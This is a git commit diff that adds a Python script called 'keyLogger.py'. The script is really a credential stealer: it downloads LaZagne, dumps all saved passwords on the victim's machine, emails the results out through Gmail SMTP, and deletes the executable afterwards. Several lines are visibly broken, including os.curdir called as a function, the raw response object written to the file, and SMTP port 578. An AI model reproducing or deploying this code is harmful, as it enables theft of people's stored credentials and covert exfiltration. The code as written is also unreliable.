a0c21fd8b635b70db934b2b78e6042a0877a9cfc
RockBlet <belyakove31@gmail.com>
2022-12-21 03:24:32 +0300

    test keylogger with lazagne

---
+++ Kotoamatsukami/keyLogger.py
@@ -0,0 +1,34 @@
+import requests
+import subprocess
+import smtplib
+import os
+import tempfile
+
+lazagne: str
+email: str
+password: str
+
+
+def download(url):
+    filename = "laZagne.exe"
+    get_response = requests.get(url)
+
+    with open(filename, "wb") as outfile:
+        outfile.write(get_response)
+
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 578)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+temp_dir = tempfile.gettempdir()
+os.curdir(temp_dir)
+download(lazagne)
+result = subprocess.check_output("laZagne.exe all", shell=True)
+send_mail(email, password, result)
+os.remove("laZagne.exe")
+ 
